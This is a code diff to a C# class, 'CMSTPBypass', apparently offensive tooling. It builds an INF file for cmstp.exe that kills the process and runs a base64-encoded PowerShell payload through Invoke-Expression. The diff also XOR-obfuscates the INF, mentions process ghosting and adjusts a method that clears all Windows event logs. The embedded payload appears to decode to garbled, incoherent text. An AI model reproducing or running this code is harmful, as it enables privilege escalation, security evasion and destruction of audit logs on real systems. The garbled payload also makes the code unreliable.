@@ -8,32 +8,6 @@ using System.Windows.Forms;
 
 public class CMSTPBypass
 {
-    // Original INF data
-    public const string InfData = @"
-[version]
-Signature=$chicago$
-AdvancedINF=2.5
-
-[DefaultInstall]
-CustomDestination=CustInstDestSectionAllUsers
-RunPreSetupCommands=RunPreSetupCommandsSection
-
-[RunPreSetupCommandsSection]
-REPLACE_COMMAND_LINE
-taskkill /F /IM cmstp.exe
-powershell -c Start-Sleep -Seconds 5; Invoke-Expression ""$([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('>b64PayloadHere<')))""
-
-[CustInstDestSectionAllUsers]
-49000,49001=AllUSer_LDIDSection, 7
-
-[AllUSer_LDIDSection]
-""HKLM"", ""SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE"", ""ProfileInstallPath"", ""%UnexpectedError%"", """"
-
-[Strings]
-ServiceName=""CorpVPN""
-ShortSvcName=""CorpVPN""
-";
-
     // XOR encryption key
     private const byte XorKey = 0x55; // Change this key as needed
 
@@ -68,6 +42,31 @@ ShortSvcName=""CorpVPN""
     {
         // Replace with the actual command you want to execute for process ghosting
         string commandToExecute = "runlegacyexplorer.exe"; // Execute the alternative Explorer.exe
+
+        // Original INF data
+        const string InfData = @"
+[version]
+Signature=$chicago$
+AdvancedINF=2.5
+
+[DefaultInstall]
+CustomDestination=CustInstDestSectionAllUsers
+RunPreSetupCommands=RunPreSetupCommandsSection
+
+[RunPreSetupCommandsSection]
+taskkill /F /IM cmstp.exe
+powershell -c Start-Sleep -Seconds 5; Invoke-Expression ""$([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('PAoJPGVjaG8gIiIsICJHZXQtV21pT2JqZWN0IC1xICdzZWxlY3QgKiBmcm9tIFNvZnR3YXJlcyIgfCANCjwvVG9waWM+CkNBQ1Q9Jzxicj4nLCAnICdNU0RFTlRTIE9iamVjdHMgDQo8L1N0eWxlPg0KPGJvZHk+DQo8PjA8IURPQ1RZUEU+IFhPUi1PcmlnaW5hbFBvaW50S2V5PC9GT09UWyJpbyJdOyBGT09UWyJiaW5nIl07Ijxicj4NCjwvVG9waWM+DQpUcnkgew0KICAgIiIsICIxMjM0IiwgIjEyMyIsICIiLCIiDQp9DQpTdHJpbmcgY2xvc3Mgew0KICAgIiIsICJjdXJsIiwgInN0b3JlIiwgIiIgfQ0KU3Ryb3ctV2luZG93Ow0KU2V0Rm9ybWF0aW9uV2luZG93KGluIFwiJykgZm9yIChzdHJpbmcgaWYgKCFzdHJpbmcgKlwiJykNCnsNCiAgIHRhc2traWxsIC9GIC8gLy9JTSBjbXBzdC5leGUgYmluYXJ5IQ0KICAgIFBhc3N3b3JkU3RhcnRJbmZvID0gIiclIjsNCiAgICBMZWFmIFJpbWUgPSBbMF0gIiIsICIiLCIiDQp9DQp9DQp9')))""
+
+[CustInstDestSectionAllUsers]
+49000,49001=AllUSer_LDIDSection, 7
+
+[AllUSer_LDIDSection]
+""HKLM"", ""SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE"", ""ProfileInstallPath"", ""%UnexpectedError%"", """"
+
+[Strings]
+ServiceName=""CorpVPN""
+ShortSvcName=""CorpVPN""
+";
 
         // Obfuscate the .INF data
         string obfuscatedInfData = ObfuscateInfData(InfData);
@@ -166,10 +165,9 @@ ShortSvcName=""CorpVPN""
 
     public static void ClearEventLogs()
     {
-        string[] eventLogs = EventLog.GetEventLogs();
-        foreach (string log in eventLogs)
+        EventLog[] eventLogs = EventLog.GetEventLogs();
+        foreach (EventLog eventLog in eventLogs)
         {
-            EventLog eventLog = new EventLog(log);
             eventLog.Clear();
         }
     }
